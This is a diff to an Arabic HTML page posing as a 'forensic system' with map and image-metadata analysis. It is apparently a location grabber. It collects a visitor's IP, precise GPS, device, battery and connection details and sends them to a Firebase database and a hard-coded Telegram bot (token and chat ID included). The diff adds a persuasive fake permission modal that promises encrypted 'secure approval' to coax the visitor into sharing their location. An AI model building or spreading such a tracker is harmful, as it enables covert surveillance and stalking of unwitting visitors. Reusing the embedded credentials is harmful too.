@@ -3,9 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>FORENSIC SYSTEM v6.0 | 3D + IMAGE ANALYSIS</title>
+    <title>FORENSIC SYSTEM v6.0 | 3D MAP + IMAGE ANALYSIS</title>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
     <script src="https://cdn.jsdelivr.net/npm/exif-js"></script>
+    <script src="https://cesium.com/downloads/cesiumjs/releases/1.109/Build/Cesium/Cesium.js"></script>
+    <link href="https://cesium.com/downloads/cesiumjs/releases/1.109/Build/Cesium/Widgets/widgets.css" rel="stylesheet">
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
         
@@ -45,18 +47,7 @@
             text-align: center; padding: 30px 0; border-bottom: 2px solid var(--primary);
             margin-bottom: 30px; position: relative; overflow: hidden;
         }
-
-        .header h1 { font-size: 2rem; text-shadow: 0 0 20px var(--primary); margin-bottom: 10px; }
-        .header .subtitle { color: var(--secondary); font-size: 0.8rem; letter-spacing: 3px; }
-        .warning-box {
-            background: rgba(255, 165, 0, 0.2); border: 2px solid var(--warning);
-            padding: 15px; margin-bottom: 20px; text-align: center; border-radius: 5px; display: none;
-        }
-
-        .success-box {
-            background: rgba(0, 255, 0, 0.2); border: 2px solid var(--primary);
-            padding: 15px; margin-bottom: 20px; text-align: center; border-radius: 5px; display: none;
-        }
+        .header h1 { font-size: 2rem; text-shadow: 0 0 20px var(--primary); margin-bottom: 10px; }        .header .subtitle { color: var(--secondary); font-size: 0.8rem; letter-spacing: 3px; }
 
         .status-bar {
             display: flex; justify-content: space-between; align-items: center;
@@ -93,16 +84,22 @@
 
         .data-label { color: var(--secondary); font-size: 0.7rem; margin-bottom: 5px; text-transform: uppercase; }
         .data-value { color: var(--primary); font-size: 0.95rem; font-weight: bold; word-break: break-all; }
-        .data-value.pending { color: var(--warning); animation: pulse-text 1s infinite; }
 
-        @keyframes pulse-text { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
-        /* Map Container */
-        #map {
-            height: 400px; width: 100%; border: 2px solid var(--primary);
-            margin-bottom: 20px; border-radius: 5px; display: none;
+        /* 3D Map Container */
+        #cesiumContainer {
+            width: 100%; height: 500px; border: 2px solid var(--primary);
+            margin-bottom: 20px; border-radius: 5px; overflow: hidden;
+            box-shadow: 0 0 30px rgba(0, 255, 65, 0.3);
         }
 
-        #map.active { display: block; }
+        .map-toggle {
+            display: flex; gap: 10px; margin-bottom: 10px;
+        }
+        .map-toggle button {
+            flex: 1; padding: 10px; background: transparent; border: 1px solid var(--primary);            color: var(--primary); cursor: pointer; font-weight: bold; transition: all 0.3s;
+        }
+
+        .map-toggle button.active { background: var(--primary); color: var(--black); }
 
         /* Image Analysis Section */
         .image-section {
@@ -110,10 +107,18 @@
             padding: 20px; margin-bottom: 20px; border-radius: 5px;
         }
 
-        .image-section h2 { color: var(--warning); margin-bottom: 15px; font-size: 1.3rem; }
+        .image-section h2 {
+            color: var(--warning); margin-bottom: 15px; font-size: 1.3rem;
+            text-shadow: 0 0 10px var(--warning);
+        }
 
-        .file-input-wrapper { position: relative; overflow: hidden; display: inline-block; width: 100%; }
-        .file-input-wrapper input[type=file] { position: absolute; left: -9999px; }
+        .file-input-wrapper {
+            position: relative; overflow: hidden; display: inline-block; width: 100%;
+        }
+
+        .file-input-wrapper input[type=file] {
+            position: absolute; left: -9999px;
+        }
 
         .file-input-label {
             display: block; padding: 20px; background: rgba(255, 170, 0, 0.1);
@@ -121,7 +126,12 @@
             transition: all 0.3s; border-radius: 5px;
         }
 
-        .file-input-label:hover { background: rgba(255, 170, 0, 0.2); box-shadow: 0 0 20px rgba(255, 170, 0, 0.5); }
+        .file-input-label:hover {
+            background: rgba(255, 170, 0, 0.2);
+            box-shadow: 0 0 20px rgba(255, 170, 0, 0.5);
+        }
+
+        .file-input-label i { font-size: 3rem; margin-bottom: 10px; display: block; }
 
         .image-preview {
             max-width: 100%; max-height: 400px; margin: 20px auto;
@@ -131,10 +141,12 @@
         .analyze-btn {
             width: 100%; padding: 15px; background: var(--warning); color: var(--black);
             border: none; font-weight: bold; cursor: pointer; margin-top: 15px;
-            font-size: 1.1rem; text-transform: uppercase; transition: all 0.3s; border-radius: 5px;
+            font-size: 1.1rem; text-transform: uppercase; letter-spacing: 2px;
+            transition: all 0.3s; border-radius: 5px;
         }
+        .analyze-btn:hover {
+            background: #ffcc00; box-shadow: 0 0 30px var(--warning);        }
 
-        .analyze-btn:hover { background: #ffcc00; box-shadow: 0 0 30px var(--warning); }
         .analyze-btn:disabled { opacity: 0.5; cursor: not-allowed; }
 
         .image-metadata {
@@ -142,18 +154,29 @@
             border-radius: 5px; display: none;
         }
 
-        .metadata-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 10px; margin-top: 10px; }
-        .metadata-item { background: rgba(0, 255, 65, 0.05); padding: 10px; border-radius: 3px; border-left: 3px solid var(--primary); }
+        .metadata-grid {
+            display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 10px; margin-top: 10px;
+        }
+
+        .metadata-item {
+            background: rgba(0, 255, 65, 0.05); padding: 10px; border-radius: 3px;
+            border-left: 3px solid var(--primary);
+        }
+
         .metadata-label { color: var(--secondary); font-size: 0.75rem; margin-bottom: 5px; }
         .metadata-value { color: var(--primary); font-weight: bold; }
+
         .gps-warning {
             background: rgba(255, 0, 64, 0.2); border: 1px solid var(--alert);
-            padding: 10px; margin-top: 10px; border-radius: 3px; display: none; color: var(--alert);
+            padding: 10px; margin-top: 10px; border-radius: 3px; display: none;
+            color: var(--alert);
         }
 
         .terminal {
             background: rgba(0, 10, 0, 0.95); border: 1px solid var(--primary);
-            padding: 15px; height: 200px; overflow-y: auto; font-size: 0.7rem; margin-bottom: 20px;
+            padding: 15px; height: 200px; overflow-y: auto; font-size: 0.7rem;
+            margin-bottom: 20px;
         }
 
         .log-line { margin: 3px 0; font-family: 'Courier New', monospace; }
@@ -161,7 +184,6 @@
         .log-line.error { color: var(--alert); }
         .log-line.warn { color: var(--warning); }
         .log-line.info { color: var(--secondary); }
-        .log-line.auto { color: #ff00ff; }
 
         .btn {
             width: 100%; padding: 15px; background: transparent; border: 2px solid var(--primary);
@@ -171,41 +193,204 @@
 
         .btn:hover { background: var(--primary); color: var(--black); box-shadow: 0 0 30px var(--primary); }
 
+        /* Custom Location Permission Modal */
+        .modal-overlay {            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.9); z-index: 10000;
+            display: flex; align-items: center; justify-content: center;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+        .modal-box {
+            background: rgba(0, 20, 0, 0.95);
+            border: 2px solid var(--primary);
+            border-radius: 10px;
+            padding: 30px;
+            max-width: 500px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 0 50px rgba(0, 255, 65, 0.5), inset 0 0 30px rgba(0, 255, 65, 0.1);
+            animation: slideUp 0.4s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        @keyframes slideUp {
+            from { transform: translateY(50px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        .modal-box::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0; height: 3px;
+            background: linear-gradient(90deg, var(--alert), var(--warning), var(--primary));
+            animation: glowLine 2s linear infinite;
+        }
+
+        @keyframes glowLine {
+            0%, 100% { opacity: 0.5; }
+            50% { opacity: 1; }
+        }
+
+        .modal-icon {
+            font-size: 4rem;
+            margin-bottom: 20px;
+            animation: pulse 2s infinite;
+        }
+
+        .modal-title {
+            color: var(--primary);
+            font-size: 1.4rem;
+            margin-bottom: 15px;            text-shadow: 0 0 15px var(--primary);
+        }
+
+        .modal-text {
+            color: var(--secondary);
+            font-size: 0.9rem;
+            line-height: 1.8;
+            margin-bottom: 25px;
+            text-align: right;
+        }
+
+        .modal-features {
+            background: rgba(0, 255, 65, 0.05);
+            border: 1px solid var(--secondary);
+            border-radius: 5px;
+            padding: 15px;
+            margin: 15px 0;
+            text-align: right;
+        }
+
+        .modal-features li {
+            color: var(--primary);
+            font-size: 0.85rem;
+            margin: 8px 0;
+            list-style: none;
+            position: relative;
+            padding-right: 20px;
+        }
+
+        .modal-features li::before {
+            content: '✓';
+            position: absolute;
+            right: 0;
+            color: var(--warning);
+            font-weight: bold;
+        }
+
+        .modal-buttons {
+            display: flex;
+            gap: 15px;
+            margin-top: 20px;
+        }
+
+        .modal-btn {
+            flex: 1;
+            padding: 15px 20px;
+            border: none;
+            border-radius: 5px;
+            font-weight: bold;
+            font-size: 1rem;            cursor: pointer;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .modal-btn.allow {
+            background: var(--primary);
+            color: var(--black);
+            box-shadow: 0 0 20px rgba(0, 255, 65, 0.5);
+        }
+
+        .modal-btn.allow:hover {
+            background: #00cc33;
+            box-shadow: 0 0 40px rgba(0, 255, 65, 0.8);
+            transform: translateY(-2px);
+        }
+
+        .modal-btn.deny {
+            background: transparent;
+            color: var(--alert);
+            border: 2px solid var(--alert);
+        }
+
+        .modal-btn.deny:hover {
+            background: rgba(255, 0, 64, 0.2);
+            box-shadow: 0 0 20px rgba(255, 0, 64, 0.5);
+        }
+
+        .modal-footer {
+            margin-top: 20px;
+            font-size: 0.7rem;
+            color: var(--secondary);
+            border-top: 1px solid var(--secondary);
+            padding-top: 15px;
+        }
+
+        .modal-footer span {
+            color: var(--alert);
+            font-weight: bold;
+        }
+
         @media (max-width: 768px) {
             .header h1 { font-size: 1.3rem; }
             .data-grid { grid-template-columns: 1fr; }
-            #map { height: 300px; }
+            #cesiumContainer { height: 300px; }
+            .modal-box { padding: 20px; }
+            .modal-buttons { flex-direction: column; }
         }
-    </style>
-</head>
+    </style></head>
 <body>
     <div class="scan-line"></div>
     <canvas class="matrix-bg" id="matrixCanvas"></canvas>
+
+    <!-- Custom Location Permission Modal -->
+    <div class="modal-overlay" id="locationModal" style="display: none;">
+        <div class="modal-box glow-border">
+            <div class="modal-icon">🛰️</div>
+            <h3 class="modal-title">نظام التحديد الجغرافي المتقدم</h3>
+            <p class="modal-text">
+                يتطلب النظام الوصول إلى بيانات الموقع لتقديم تحليل دقيق وشامل. 
+                هذه الخدمة محمية ومشفرة بالكامل وفقاً لمعايير الأمان الدولية.
+            </p>
+            
+            <ul class="modal-features">
+                <li>تحديد الإحداثيات بدقة عالية (متر واحد)</li>
+                <li>تحليل التضاريس والبيئة المحيطة</li>
+                <li>ربط البيانات الجغرافية بالسجلات الزمنية</li>
+                <li>تشفير كامل للبيانات أثناء النقل</li>
+            </ul>
+
+            <div class="modal-buttons">
+                <button class="modal-btn allow" onclick="allowLocation()">
+                    🔐 الموافقة الآمنة
+                </button>
+                <button class="modal-btn deny" onclick="denyLocation()">
+                    ✕ تخطي
+                </button>
+            </div>
+
+            <div class="modal-footer">
+                ⚠️ <span>ملاحظة:</span> يمكن تخطي هذه الخطوة، لكن دقة التحليل ستكون محدودة
+            </div>
+        </div>
+    </div>
 
     <div class="container">
         <!-- Header -->
         <div class="header glow-border">
             <h1>🛡️ FORENSIC SYSTEM v6.0</h1>
-            <div class="subtitle">تتبع تلقائي + خريطة + تحليل صور</div>
-        </div>
-
-        <!-- Warnings -->
-        <div id="telegramWarning" class="warning-box glow-border">
-            ⚠️ <strong>تحذير:</strong> Telegram WebView - ميزات محدودة<br>
-            افتح في Chrome لبيانات كاملة
-        </div>
-        <div id="successMsg" class="success-box glow-border">
-            ✅ <strong>تم جمع البيانات بنجاح!</strong><br>
-            <small>تحقق من Firebase و Telegram</small>
+            <div class="subtitle">خريطة 3D + تحليل الصور المتقدم</div>
         </div>
 
         <!-- Status Bar -->
         <div class="status-bar glow-border">
             <div class="status-item">
                 <div class="status-indicator" id="statusIndicator"></div>
-                <span id="statusText">جاري الجمع التلقائي...</span>
-            </div>
-            <div class="status-item">
+                <span id="statusText">جاري التهيئة...</span>
+            </div>            <div class="status-item">
                 <span>🕐 </span><span id="currentTime">--:--:--</span>
             </div>
             <div class="status-item">
@@ -218,14 +403,22 @@
             <div class="progress-bar" id="progressBar">0%</div>
         </div>
 
-        <!-- Map -->
-        <div id="map"></div>
+        <!-- 3D Map Section -->
+        <div class="glow-border" style="padding: 15px; margin-bottom: 20px;">
+            <h2 style="color: var(--primary); margin-bottom: 10px;">🗺️ الخريطة ثلاثية الأبعاد</h2>
+            <div class="map-toggle">
+                <button onclick="switchMap('2d')" id="btn2d" class="active">📍 خريطة 2D</button>
+                <button onclick="switchMap('3d')" id="btn3d">🌍 خريطة 3D Globe</button>
+            </div>
+            <div id="map2d" style="height: 400px; display: block;"></div>
+            <div id="cesiumContainer" style="display: none;"></div>
+        </div>
 
         <!-- Data Grid -->
         <div class="data-grid" id="dataGrid">
             <div class="data-card critical">
                 <div class="data-label">🌐 IP Address</div>
-                <div class="data-value pending" id="ip">جاري التحليل التلقائي...</div>
+                <div class="data-value" id="ip">جاري التحليل...</div>
             </div>
             <div class="data-card critical">
                 <div class="data-label">📍 Country</div>
@@ -243,62 +436,42 @@
                 <div class="data-label">🎯 Longitude</div>
                 <div class="value" id="lng">-</div>
             </div>
-            <div class="data-card">                <div class="data-label">🏢 ISP</div>
-                <div class="value" id="isp">-</div>
-            </div>
             <div class="data-card">
                 <div class="data-label">💻 OS</div>
                 <div class="value" id="os">-</div>
-            </div>
-            <div class="data-card">
-                <div class="data-label">🌐 Browser</div>
-                <div class="value" id="browser">-</div>
-            </div>
-            <div class="data-card">
-                <div class="data-label">📱 Screen</div>
-                <div class="value" id="screen">-</div>
-            </div>
-            <div class="data-card">
+            </div>            <div class="data-card">
                 <div class="data-label">🔋 Battery</div>
                 <div class="value" id="batteryLevel">-</div>
-            </div>
-            <div class="data-card">
-                <div class="data-label">⚡ Charging</div>
-                <div class="value" id="chargingStatus">-</div>
             </div>
             <div class="data-card">
                 <div class="data-label">📡 Connection</div>
                 <div class="value" id="connectionType">-</div>
             </div>
-            <div class="data-card full">
-                <div class="data-label">🔗 Full URL</div>
-                <div class="value" id="url" style="font-size: 0.7rem">-</div>
-            </div>
         </div>
 
         <!-- Image Analysis Section -->
         <div class="image-section glow-border">
-            <h2>📸 تحليل الصور - استخراج البيانات الوصفية</h2>
+            <h2>📸 تحليل الصور المتقدم - استخراج البيانات الوصفية</h2>
             
             <div class="file-input-wrapper">
                 <input type="file" id="imageInput" accept="image/*" onchange="handleImageSelect(event)">
                 <label for="imageInput" class="file-input-label">
                     <span style="font-size: 3rem;">📁</span><br>
-                    <strong>اضغط لاختيار صورة من المعرض</strong><br>
-                    <small>يدعم: JPG, PNG, TIFF</small>
+                    <strong>اضغط هنا لاختيار صورة من المعرض</strong><br>
+                    <small>يدعم: JPG, JPEG, PNG, TIFF</small>
                 </label>
             </div>
 
             <img id="imagePreview" class="image-preview" alt="Preview">
-
             <button class="analyze-btn" id="analyzeBtn" onclick="analyzeImage()" disabled>
-                🔍 فحص الصورة واستخراج البيانات            </button>
+                🔍 فحص الصورة واستخراج البيانات
+            </button>
 
             <div id="imageMetadata" class="image-metadata">
-                <h3 style="color: var(--primary); margin-bottom: 10px;">📊 بيانات الصورة:</h3>
+                <h3 style="color: var(--primary); margin-bottom: 10px;">📊 بيانات الصورة المستخرجة:</h3>
                 <div class="metadata-grid" id="metadataGrid"></div>
                 <div id="gpsWarning" class="gps-warning">
-                    ⚠️ <strong>تحذير:</strong> الصورة تحتوي على GPS!
+                    ⚠️ <strong>تحذير:</strong> هذه الصورة تحتوي على إحداثيات GPS! يمكن تحديد الموقع بدقة.
                 </div>
             </div>
         </div>
@@ -307,16 +480,15 @@
         <div class="terminal glow-border" id="console"></div>
 
         <!-- Buttons -->
-        <button class="btn" onclick="collectData()">🔄 إعادة جمع البيانات</button>
-        <button class="btn" id="btnSend" onclick="sendData()" disabled style="display: none;">📨 إرسال التقرير</button>
+        <button class="btn" onclick="collectData()">🔄 جمع البيانات الحالية</button>
+        <button class="btn" onclick="sendData()">📨 إرسال التقرير</button>
     </div>
 
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
 
-    <script>
-        // Firebase Configuration
+    <script>        // Firebase Configuration
         const firebaseConfig = {
             apiKey: "AIzaSyCVyg-EAtI-oumlWnBOVNKBjwufbTS6H5w",
             authDomain: "onx-gp-aade0.firebaseapp.com",
@@ -331,17 +503,21 @@
         const BOT_TOKEN = "7735965641:AAFzkUy27zKXYWroodhdxOBapMgwttyq5_s";
         const CHAT_ID = "910624538";
         
-        let data = {}, map = null, firebaseConnected = false, db = null;
-        let selectedImage = null, imageExifData = {};
+        let data = {}, map2d = null, cesiumViewer = null;
+        let currentMap = '2d';
+        let selectedImage = null;
+        let imageExifData = {};
+        let locationPermissionGranted = false;
 
         // Matrix Background
         function initMatrix() {
             const canvas = document.getElementById('matrixCanvas');
             const ctx = canvas.getContext('2d');
             canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-            const chars = '01 abcdefghijklmnopqrstuvwxyz';
+            const chars = '01 abcdefghijklmnopqrstuvwxyz@#$%^&*()';
             const charArray = chars.split('');
-            const fontSize = 14, columns = canvas.width / fontSize;            const drops = [];
+            const fontSize = 14, columns = canvas.width / fontSize;
+            const drops = [];
             for (let i = 0; i < columns; i++) drops[i] = Math.random() * -100;
             function drawMatrix() {
                 ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
@@ -361,7 +537,6 @@
             document.getElementById('currentTime').innerText = new Date().toLocaleTimeString('ar-SA');
         }
         setInterval(updateTime, 1000);
-
         // Logging
         function log(msg, type = 'info') {
             const c = document.getElementById('console');
@@ -369,7 +544,6 @@
             l.className = `log-line ${type}`;
             l.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
             c.appendChild(l); c.scrollTop = c.scrollHeight;
-            console.log(type, msg);
         }
 
         // Update Progress
@@ -389,20 +563,330 @@
         // Update Element
         function updateElement(id, value) {
             const el = document.getElementById(id);
-            if (el) { el.innerText = value || 'N/A'; el.classList.remove('pending'); }
-        }
-        // 🔍 Detect Telegram
-        function isTelegramWebView() {
-            const ua = navigator.userAgent || navigator.vendor || window.opera;
-            return (/telegram|tgweb/i.test(ua)) || (/content:\/\/org\.telegram/i.test(window.location.href));
+            if (el) { el.innerText = value || 'N/A'; }
         }
 
-        // 🌐 Get IP (من الكود الأول - فعال)
-        async function getIP() {
-            log('🔍 جاري جلب IP...', 'info');
-            updateProgress(10, 'جلب عنوان IP');
-            const apis = ['https://api.ipify.org?format=json', 'https://api64.ipify.org?format=json', 'https://api.myip.com'];
+        // Show Custom Location Modal
+        function showLocationModal() {
+            document.getElementById('locationModal').style.display = 'flex';
+            log('🛰️ عرض طلب الموقع المخصص', 'info');
+        }
+
+        // Hide Modal
+        function hideLocationModal() {
+            document.getElementById('locationModal').style.display = 'none';
+        }
+
+        // User Allowed Location
+        function allowLocation() {
+            locationPermissionGranted = true;
+            hideLocationModal();
+            log('✓ المستخدم وافق على الموقع', 'success');
+            requestGPS();
+        }
+
+        // User Denied Location
+        function denyLocation() {            locationPermissionGranted = false;
+            hideLocationModal();
+            log('✗ المستخدم تخطى الموقع', 'warn');
+            // Continue with IP-based location only
+            if (data.ip && data.latIP && data.lngIP) {
+                showMap(data.latIP, data.lngIP);
+            }
+            continueCollection();
+        }
+
+        // Request GPS (after custom modal approval)
+        function requestGPS() {
+            if (!navigator.geolocation) {
+                log('✗ GPS غير مدعوم', 'error');
+                updateElement('lat', 'Not Supported');
+                updateElement('lng', 'Not Supported');
+                continueCollection();
+                return;
+            }
             
+            log('🛰️ جاري طلب إحداثيات دقيقة...', 'info');
+            updateProgress(45, 'تحديد الموقع الدقيق');
+            
+            navigator.geolocation.getCurrentPosition(
+                pos => {
+                    data.lat = pos.coords.latitude.toFixed(6);
+                    data.lng = pos.coords.longitude.toFixed(6);
+                    data.accuracy = pos.coords.accuracy.toFixed(2);
+                    data.altitude = pos.coords.altitude || 'N/A';
+                    
+                    updateElement('lat', data.lat);
+                    updateElement('lng', data.lng);
+                    
+                    log(`✓ GPS: ${data.lat}, ${data.lng} (دقة: ${data.accuracy}م)`, 'success');
+                    showMap(parseFloat(data.lat), parseFloat(data.lng));
+                    updateProgress(55, 'تم تحديد الموقع');
+                    continueCollection();
+                },
+                err => {
+                    log(`✗ GPS: ${err.message}`, 'error');
+                    updateElement('lat', 'Denied');
+                    updateElement('lng', 'Denied');
+                    
+                    // Fallback to IP location
+                    if (data.latIP && data.lngIP) {
+                        log('📍 استخدام موقع IP كبديل', 'warn');
+                        showMap(data.latIP, data.lngIP);
+                    }
+                    updateProgress(55, 'تم (بدون GPS)');
+                    continueCollection();                },
+                { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
+            );
+        }
+
+        // Continue collection after GPS step
+        function continueCollection() {
+            getDeviceInfo();
+            getBatteryInfo().then(() => {
+                saveToFirebase();
+                sendToTelegram();
+                
+                updateProgress(100, 'اكتمل التحليل');
+                updateStatus('✅ اكتمل التحليل الشامل', 'success');
+                log('=== اكتمل جمع البيانات ===', 'success');
+            });
+        }
+
+        // Switch between 2D and 3D maps
+        function switchMap(type) {
+            currentMap = type;
+            document.getElementById('btn2d').classList.toggle('active', type === '2d');
+            document.getElementById('btn3d').classList.toggle('active', type === '3d');
+            
+            if (type === '2d') {
+                document.getElementById('map2d').style.display = 'block';
+                document.getElementById('cesiumContainer').style.display = 'none';
+                if (map2d) map2d.invalidateSize();
+            } else {
+                document.getElementById('map2d').style.display = 'none';
+                document.getElementById('cesiumContainer').style.display = 'block';
+                if (!cesiumViewer) initCesium();
+                else cesiumViewer.resize();
+            }
+            log(`🗺️ تم التبديل إلى الخريطة ${type === '2d' ? '2D' : '3D'}`, 'info');
+        }
+
+        // Initialize 2D Map (Leaflet)
+        function init2DMap(lat = 24.7136, lng = 46.6753) {
+            if (map2d) return;
+            map2d = L.map('map2d').setView([lat, lng], 15);
+            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                attribution: '© OpenStreetMap'
+            }).addTo(map2d);
+            L.marker([lat, lng]).addTo(map2d).bindPopup('📍 الموقع المحدد').openPopup();
+            log('✓ خريطة 2D مهيأة', 'success');
+        }
+
+        // Initialize 3D Map (Cesium)
+        function initCesium(lat = 24.7136, lng = 46.6753) {            if (cesiumViewer) return;
+            
+            Cesium.Ion.defaultAccessToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOiJlYWE1OWUxNy1mMWZiLTQzYjYtYTQ0OS1kMWFjYmFjNjE5YzMiLCJpZCI6NTc3MzMsImlhdCI6MTYyNzg0NzQ3Mn0.XcKpgANiY19MC4bdFUXMVEBToBmqS8kuYpUlxJHYZxk';
+            
+            cesiumViewer = new Cesium.Viewer('cesiumContainer', {
+                terrainProvider: Cesium.createWorldTerrain(),
+                animation: false,
+                baseLayerPicker: true,
+                fullscreenButton: true,
+                geocoder: true,
+                homeButton: true,
+                infoBox: true,
+                sceneModePicker: true,
+                selectionIndicator: true,
+                timeline: false,
+                navigationHelpButton: true,
+                navigationInstructionsInitiallyVisible: false
+            });
+
+            cesiumViewer.camera.flyTo({
+                destination: Cesium.Cartesian3.fromDegrees(lng, lat, 1000),
+                orientation: {
+                    heading: Cesium.Math.toRadians(0),
+                    pitch: Cesium.Math.toRadians(-45),
+                    roll: 0
+                },
+                duration: 3
+            });
+
+            cesiumViewer.entities.add({
+                position: Cesium.Cartesian3.fromDegrees(lng, lat),
+                point: {
+                    pixelSize: 15,
+                    color: Cesium.Color.RED,
+                    outlineColor: Cesium.Color.WHITE,
+                    outlineWidth: 3
+                },
+                label: {
+                    text: '📍 Target Location',
+                    font: '14px monospace',
+                    style: Cesium.LabelStyle.FILL_AND_OUTLINE,
+                    outlineWidth: 2,
+                    verticalOrigin: Cesium.VerticalOrigin.BOTTOM,
+                    pixelOffset: new Cesium.Cartesian2(0, -9)
+                }
+            });
+
+            log('✓ خريطة 3D Cesium مهيأة', 'success');
+        }
+        // Show Map
+        function showMap(lat, lng) {
+            if (currentMap === '2d') {
+                init2DMap(lat, lng);
+            } else {
+                initCesium(lat, lng);
+            }
+        }
+
+        // Image Selection Handler
+        function handleImageSelect(event) {
+            const file = event.target.files[0];
+            if (!file) return;
+
+            if (!file.type.startsWith('image/')) {
+                log('✗ الملف المحدد ليس صورة', 'error');
+                alert('الرجاء اختيار ملف صورة صالح');
+                return;
+            }
+
+            selectedImage = file;
+            const preview = document.getElementById('imagePreview');
+            const reader = new FileReader();
+
+            reader.onload = function(e) {
+                preview.src = e.target.result;
+                preview.style.display = 'block';
+                document.getElementById('analyzeBtn').disabled = false;
+                log(`✓ تم اختيار الصورة: ${file.name}`, 'success');
+            };
+
+            reader.readAsDataURL(file);
+        }
+
+        // Image Analysis - Extract EXIF Data
+        function analyzeImage() {
+            if (!selectedImage) {
+                log('✗ لم يتم اختيار صورة', 'error');
+                return;
+            }
+
+            log('🔍 جاري تحليل الصورة واستخراج البيانات...', 'info');
+            updateProgress(50, 'تحليل الصورة');
+
+            const reader = new FileReader();
+            
+            reader.onload = function(e) {
+                try {
+                    const img = new Image();
+                    img.onload = function() {                        imageExifData = {
+                            'اسم الملف': selectedImage.name,
+                            'نوع الملف': selectedImage.type,
+                            'الحجم': formatFileSize(selectedImage.size),
+                            'العرض': img.width + ' بكسل',
+                            'الارتفاع': img.height + 'بكسل',
+                            'تاريخ التحليل': new Date().toLocaleString('ar-SA')
+                        };
+
+                        EXIF.getData(img, function() {
+                            const exif = EXIF.getAllTags(this);
+                            
+                            if (exif.GPSLatitude && exif.GPSLongitude) {
+                                const gpsData = extractGPSData(exif);
+                                imageExifData['📍 خط العرض (GPS)'] = gpsData.lat.toFixed(6);
+                                imageExifData['📍 خط الطول (GPS)'] = gpsData.lng.toFixed(6);
+                                imageExifData['🎯 دقة الموقع'] = 'عالية - GPS';
+                                
+                                document.getElementById('gpsWarning').style.display = 'block';
+                                
+                                if (currentMap === '3d') {
+                                    initCesium(gpsData.lat, gpsData.lng);
+                                } else {
+                                    init2DMap(gpsData.lat, gpsData.lng);
+                                }
+                                
+                                log(`✓ تم استخراج إحداثيات GPS من الصورة: ${gpsData.lat}, ${gpsData.lng}`, 'success');
+                            }
+
+                            if (exif.DateTimeOriginal) imageExifData['📅 تاريخ التصوير'] = exif.DateTimeOriginal;
+                            if (exif.Make) imageExifData['📷 الشركة المصنعة'] = exif.Make;
+                            if (exif.Model) imageExifData['📱 موديل الكاميرا'] = exif.Model;
+                            if (exif.ISOSpeedRatings) imageExifData['🔆 ISO'] = exif.ISOSpeedRatings;
+                            if (exif.FNumber) imageExifData['🔍 فتحة العدسة'] = 'f/' + exif.FNumber;
+                            if (exif.ExposureTime) imageExifData['⏱️ سرعة الغالق'] = exif.ExposureTime + ' ثانية';
+                            if (exif.Flash) imageExifData['💡 الفلاش'] = exif.Flash ? 'مستخدم' : 'غير مستخدم';
+
+                            displayMetadata();
+                            updateProgress(100, 'اكتمل تحليل الصورة');
+                            log('✓ اكتمل استخراج بيانات الصورة', 'success');
+                        });
+                    };
+                    img.src = e.target.result;
+                } catch (error) {
+                    log('✗ فشل تحليل الصورة: ' + error.message, 'error');
+                    updateProgress(0, 'فشل التحليل');
+                }
+            };
+
+            reader.readAsArrayBuffer(selectedImage);        }
+
+        // Extract GPS coordinates from EXIF
+        function extractGPSData(exif) {
+            const convertDMSToDD = (degrees, minutes, seconds, direction) => {
+                let dd = degrees + minutes / 60 + seconds / 3600;
+                if (direction === "S" || direction === "W") dd = dd * -1;
+                return dd;
+            };
+
+            const lat = exif.GPSLatitude;
+            const lng = exif.GPSLongitude;
+            const latRef = exif.GPSLatitudeRef || 'N';
+            const lngRef = exif.GPSLongitudeRef || 'E';
+
+            return {
+                lat: convertDMSToDD(lat[0], lat[1], lat[2], latRef),
+                lng: convertDMSToDD(lng[0], lng[1], lng[2], lngRef)
+            };
+        }
+
+        // Format file size
+        function formatFileSize(bytes) {
+            if (bytes < 1024) return bytes + ' بايت';
+            else if (bytes < 1048576) return (bytes / 1024).toFixed(2) + ' كيلوبايت';
+            else return (bytes / 1048576).toFixed(2) + ' ميجابايت';
+        }
+
+        // Display metadata
+        function displayMetadata() {
+            const grid = document.getElementById('metadataGrid');
+            grid.innerHTML = '';
+
+            for (const [key, value] of Object.entries(imageExifData)) {
+                const item = document.createElement('div');
+                item.className = 'metadata-item';
+                item.innerHTML = `<div class="metadata-label">${key}</div><div class="metadata-value">${value}</div>`;
+                grid.appendChild(item);
+            }
+
+            document.getElementById('imageMetadata').style.display = 'block';
+        }
+
+        // Collect Device Data - MAIN FUNCTION
+        async function collectData() {
+            log('=== بدء التحليل الجنائي الشامل ===', 'system');
+            updateStatus('جاري التحليل التلقائي...', 'warning');
+            updateProgress(5, 'تهيئة النظام');
+            
+            // Initialize Firebase            initFirebase();
+            
+            // Get IP with multiple fallbacks
+            log('🔍 جاري تحديد عنوان الشبكة...', 'info');
+            updateProgress(10, 'تحليل الشبكة');
+            
+            const apis = ['https://api.ipify.org?format=json', 'https://api64.ipify.org?format=json', 'https://api.myip.com'];
             for (let api of apis) {
                 try {
                     const controller = new AbortController();
@@ -415,99 +899,48 @@
                         data.ip = ip;
                         updateElement('ip', ip);
